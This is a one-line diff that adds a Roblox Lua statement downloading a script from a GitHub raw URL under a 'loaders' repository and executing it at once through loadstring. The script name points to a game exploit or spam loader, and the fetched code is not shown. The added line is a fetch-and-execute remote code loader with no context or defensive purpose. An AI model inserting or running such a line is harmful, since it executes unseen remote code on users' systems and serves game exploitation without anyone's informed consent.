@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/forest-market-spam7-dqe1jf33o2i7ef.lua"))()
